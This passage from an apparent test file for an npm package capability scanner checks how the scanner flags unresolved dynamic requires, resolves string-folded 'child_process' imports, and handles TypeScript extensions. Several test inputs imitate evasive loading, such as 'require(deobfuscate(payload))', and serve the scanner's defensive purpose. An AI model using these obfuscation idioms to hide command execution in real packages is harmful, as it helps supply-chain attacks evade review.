  }

  test('is recorded and flagged', () => {
    const m = scan('const cp = require(deobfuscate(payload));\n');
    assert.equal(m.capabilities.unresolvedRequire.present, true);
    assert.ok(m.riskFlags.some((f) => f.includes('could not be resolved')));
  });

  test('covers a specifier that only exists at runtime', () => {
    assert.equal(scan('require(process.env.MOD_NAME);\n').capabilities.unresolvedRequire.present, true);
    assert.equal(scan('const m = await import(userInput);\n').capabilities.unresolvedRequire.present, true);
  });

  // A path anchored inside the package resolves to a file the walk already
  // read, so its capabilities are in the manifest either way.
  test('ignores a path anchored inside the package', () => {
    assert.equal(scan('require(path.join(__dirname, name));\n').capabilities.unresolvedRequire.present, false);
    assert.equal(scan("require('./' + name);\n").capabilities.unresolvedRequire.present, false);
  });

  test('stays quiet on a specifier the folds resolve', () => {
    assert.equal(scan("const m = 'child_process';\nrequire(m);\n").capabilities.unresolvedRequire.present, false);
    assert.equal(scan("require('child' + '_process');\n").capabilities.unresolvedRequire.present, false);
  });

  test('is not a property named require', () => {
    assert.equal(scan('mod.require(x);\n').capabilities.unresolvedRequire.present, false);
    assert.equal(scan('__webpack_require__(123);\n').capabilities.unresolvedRequire.present, false);
  });
});


test('scans modern TypeScript extensions without requiring an AST parser', (t) => {
  const root = mkTmpDir('typescript-extensions');
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const dir = writePackage(root, 'pkg', { name: 'typed' }, {
    'index.cts': "const cp = require('child_process');",
    'index.mts': "import https from 'https';",
    'index.d.mts': "import type { Stats } from 'fs';",
  });
  const manifest = scanPackageDir(dir);
  assert.equal(manifest.sourceFilesScanned, 3);
  assert.equal(manifest.capabilities.exec.present, true);
  assert.equal(manifest.capabilities.network.present, true);
  assert.equal(manifest.capabilities.filesystem.present, false);
});
